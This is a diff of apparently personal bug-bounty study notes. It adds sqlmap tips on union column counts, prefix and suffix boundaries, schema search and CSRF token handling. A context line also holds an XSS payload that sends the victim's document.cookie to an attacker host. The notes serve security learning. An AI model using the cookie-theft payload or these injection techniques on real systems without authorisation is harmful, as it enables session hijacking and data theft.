@@ -54,7 +54,9 @@ Stuff for CBBH
     "><img src=x onerror=this.src="http://ip/?c"+document.cookie;>
 
   SQLmap
-
+    
+    ##TIP: IF YOU CAN FIND BOUNDARIES, TRY TO COUNT THE NUMBER OF COLUMNS AND SPECIFY IT IN SQLMAP
+    
     #Techniques and their meaning
     B: Boolean-based blind
     E: Error-based
@@ -76,5 +78,19 @@ Stuff for CBBH
     #To provide a certain number of cols
     --union-cols=1337
 
+    #Boundaries
+    Once you've found a specific prefix, do not forget to add the apostrophe ' to it
+    --prefix="<change-here>"
+    --suffix="<change-here>"
+
+    #Search function
+    --search 
+    -C: column
+    -T: table
+    -D: database
+
+    #Handling csrf token
+    ##NOTE: THE PROPER WAY TO HANDLE THIS KINDA TOKEN IS BY, PASSING THEM WHEREVER THEY APPEAR (e.g cookie/body) AND USE THE FLAG --csrf-token WITH THE NAME OF THE PARAM THAT HOLDS THE TOKEN
+    
     
     
